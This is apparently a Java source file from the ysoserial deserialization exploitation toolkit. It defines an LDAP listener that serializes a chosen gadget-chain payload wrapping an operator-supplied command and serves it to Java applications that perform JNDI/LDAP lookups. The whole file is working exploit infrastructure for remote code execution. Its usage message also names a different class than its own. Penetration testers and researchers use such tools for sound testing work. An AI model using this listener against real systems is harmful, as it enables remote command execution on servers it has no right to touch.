package ysoserial.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import ysoserial.exploit.ldap.component.LocalChainOperationInterceptor;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPLocalChainListener {
    private InMemoryDirectoryServer ds;

    public LDAPLocalChainListener(int lport, Object payload) {
        InMemoryDirectoryServerConfig config = null;
        try {
            config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                lport,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

            byte[] bytes = Serializer.serialize(payload);

            config.addInMemoryOperationInterceptor(new LocalChainOperationInterceptor(bytes));
            ds = new InMemoryDirectoryServer(config);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() throws Exception {
        ds.startListening();
    }

    public static void main(String[] args)  throws Exception {
        if ( args.length != 3 ) {
            System.err.println(LDAPTomcatRefListener.class.getName() + " <port> <payload> <command>");
            System.exit(-1);
            return;
        }

        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(args[1]);
            if (payloadClass == null) {
                System.err.println("Invalid payload type '" + args[1] + "'");
                System.exit(-1);
                return; // make null analysis happy
            }
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(args[2]);

            int port = Integer.parseInt(args[0]);
            LDAPLocalChainListener ldapRefListener = new LDAPLocalChainListener(port, object);
            ldapRefListener.run();
        } catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }
}
